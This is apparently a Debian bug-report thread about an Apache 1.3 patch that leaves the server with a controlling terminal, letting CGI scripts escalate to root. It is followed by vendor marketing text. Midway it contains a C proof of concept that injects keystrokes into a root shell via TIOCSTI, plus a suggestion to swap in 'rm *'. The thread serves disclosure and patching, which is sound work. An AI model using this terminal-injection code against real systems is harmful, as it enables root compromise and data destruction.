Subject: use setsid() to detach from controlling tty
Date: Fri, 17 Mar 2006 20:29:25 -0800 (PST)
```
Package: apache
Version: 1.3.34-2

i'm not sure i understand the motivation behind patch 033_-F_NO_SETSID ...

the problem in #244857 is a result of the following behaviour of
setsid(2):

	On error, -1 is returned, and errno is set.  The only error
	which can happen is EPERM. It is returned  when  the  process
	group ID of any process equals the PID of the calling process.
	Thus, in particular, setsid() fails if the calling process is
	already a process group leader.

the user invoked "apache -F" which doesn't fork() before attempting
setsid() ... this fails with EPERM... and apache foolishly exits.

the real fix is to just warn on that error from setsid() and continue.

the fix that's currently in debian apache (use setpgrp()) leaves apache
with a controlling tty... which is a bad thing, see setpgrp(2):

	If a session has a controlling terminal, CLOCAL is not set and
	a hangup occurs, then the session leader is sent a SIGHUP. If
	the session leader exits, the SIGHUP signal will be sent to
	each process in the foreground process group of  the  con-
	trolling terminal.

please consider reverting 033_-F_NO_SETSID and/or allow setsid() to fail
with EPERM when do_detach == 0.

thanks

Subject: Relation to escalation to root
Date: Wed, 17 Jan 2007 17:42:15 +0000
```
If I have understood this correctly, preserving the controlling tty like this
allows an escalation from www-data to root. If, for example, I run
"/etc/init.d/apache start" from a root shell which I don't close soon after,
a resulting apache process running as www-data will share a controlling tty
with a root shell. A remote compromise of that process can then just inject
characters using TIOCSTI and execute commands as root.
In my opinion, it's not immensely unreasonable to manually bring down apache
and start it up again from a shell.
Why is this bug still unresolved after so long? The current workaround is of
course to immediately kill any terminal that has just invoked apache.

Subject: CGI scripts can get root
Date: Mon, 22 Jan 2007 11:05:45 +0000
```
I noticed that suexec doesn't abdicate the controlling terminal either, and I'd
not be surprised to find out that non-suexec CGI invocation didn't do this
either. The result is that I've just been able to escalate from local user -->
root by writing a hostile CGI script - this is no longer just a case of having
to find an exploit in apache itself.

To fix this problem, revert the 033_-F_NO_SETSID patch. It only introduced
minor functionality, and if anyone really cares about having it, they can try
submitting a new patch. One that doesn't introduce a root exploit into the
package, ideally.

Replacing 033_-F_NO_SETSID with the attached patch which allows setsid()
to fail when do_detach == 0 should retain the fix for #244857 while also
closing the local root hole present with 033_-F_NO_SETSID.
514_nice_proxy_cache_cleanup also needs updating as it patches against
the same file (also attached).

I have prepared an NMU with the attached patches, which can be found at
<http://mjj29.matthew.ath.cx/debian-upload/apache/>. I hope that the RMs
will consider this change for etch as it closes a potential (if not
high-priority) root exploit in our apache package. I am not a DD, so I
shall be looking for a sponsor to upload this package if the apache
maintenance team don't do so first.

Can anyone reproduce this?  Apache seems to have closed the tty fd well
before running a CGI.  I haven't been successful abusing it with
TIOCSTI.  Does anyone see a way that this is actually a security
problem?

Yes, Apache closes fds 0,1 and 2 (well, reopens them to /dev/null) , but
retains the controlling tty - this can be accessed via opening /dev/tty . The
controlling tty is a process property that is separate from the fds it has
open, and allows certain ioctl powers on any fd matching that. A 'ps' listing
will show the controlling tty of each process - you'll notice that most servers
have '?', but apache will have something of the form 'pts/n' or 'ttyn' so long
as the shell that spawned it is still open. This is the sample exploit code;

#include <fcntl.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <sys/select.h>
#include <sys/types.h>
#include <unistd.h>

int main(char** args,int argc)
{
    const char* fake = "echo lol you got owned\n";
    const char* fake_ptr = fake;
    int pts = open("/dev/tty",O_RDONLY);
    while(*fake_ptr != '\0')
    {
        ioctl(pts,TIOCSTI,fake_ptr);
        fake_ptr++;
    }

    return 0;
}

Install it as a local user's CGI (I've verified this under suexec at least),
and have the webserver run it. If the shell that ran the apache init script is
still open, it will actually execute the command and echo out "lol you got
owned". Substitute this for rm *  as you see fit.

Why isn't anybody of the official maintainers reacting or commenting on
this bug? There are 3(!) completely undocumented downgrades of a bug,
that IMHO (from reading) fits the "grave" severity. Please react or comment,
when we can expect a fixed package or why this bug-severity can be downgraded
or the situation will become really annoying.

The downgrades aren't undocumented.  Look at the full downgrade messages.
The first time it was downgraded, the comment was:

    unexplained severity inflation

Then an explanation was added, and the second time the bug was downgraded,
the comment was:

    holes depending on terminal exploits have not been treated as RC

which I believe is still correct.

Controlling terminal exploits are possible but hard, and in this
particular case, requires a fairly specific alignment of issues: Apache
must be started with -F, which is an unusual way of running Apache to
start with, and the root shell has to be left open long enough for someone
to discover this state and run an exploit.  Usually people who routinely
run Apache with -F are doing so via something like runit or supervise,
which already won't have a controlling terminal, and running Apache -F by
hand is normally only done for debugging.

I certainly agree that it would be good to fix the bug, but I also can see
why the severity was downgraded.

# holes depending on terminal exploits have not been treated as RC

I suspect that the above downgrade message from vorlon is the one that
you missed seeing. He's probably referring to various other terminal
exploits, such as escape character issues with eterm. This seems like a
significantly different class of problem than those, though, IMHO.

OTOH, not all security holes are grave and the circumstances needed to
exploit this one seem sufficiently rare to not consider it grave.

On the third hand, this bug has documented a security hole with exploit
in apache for about 2 weeks without any reaction from its maintainers,
and was open for many months before that without any reaction from them.
If apache isn't being maintained, it might be better to drop it from
etch anyway.

I think Russ explained pretty nicely why this escalation is pretty rare
from being a true vulnerability, although there indeed is an attack
window if you do -F, forget about it, forget about the terminal (until
cron.daily where apache gets restarted by logrotate).

Anyway, from talking to Fabbione, NMU's are always welcome if someone
wants to properly test the patch such that it does what it claims it
does -- the idea behind the patch is ok in any case.

The description given is somewhat incorrect. The escalation exists
whether run with -F or not. 033_-F_NOSETSID disables running setsid in
all cases. This means that running /etc/init.d/apache start and then not
closing the terminal (and people do have long-running shells like this)
leaves you vulnerable---this has been verified by richard thrippleton.

I've tested my patch and it both closes this vulnerability while still
allowing use of apache with -F. Please could someone upload the NMU I
linked to above.

Thanks,
Matt

As the person who found and has thoroughly tested this bug, I can confirm
firsthand that this isn't just a case of apache being vulnerable with "-F"! I
specifically mentioned using the init script in the original report over a
month ago, not "-F". That is, the circumstances required to exploit this are
not 'rare'.
With this in mind, I'm still confused as to why if you can root a machine with
a buffer overflow, it's critical, but if you can root a machine using a
terminal exploit, it's not. Either way, you end up with an owned machine, the
method is unimportant.

I'm sorry. You are right. I was just taking an overview of the full
texts and expected any comment after the bts-command. I see it now and I
say sorry to Steve Langasek. I was in hurry and annoyed by the fact,
that although this bug is now open for almost a year, there were 3
severity downgrades, but no real reaction. Didn't know that special
treating of terminal exploits.

Indeed, I'm quite disappointed about apache 1.3 still being in Etch.
Debian is the _only_ distribution still shipping it; the maintainers
couldn't provide _any_ valid reason to still include it (like an important
module not ported to 2.x) and claimed that they would provide all security
updates for 1.3 issues. Well...

Cheers,
        Moritz

Because 1.3 is on an Sempron 2200+ with 3 GByte of memory and
over 400 VHosts using php5 several times faster then apache2?

2.0 would force me to a unneccesary Mainboard, CPU and Memory
upgrade...

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
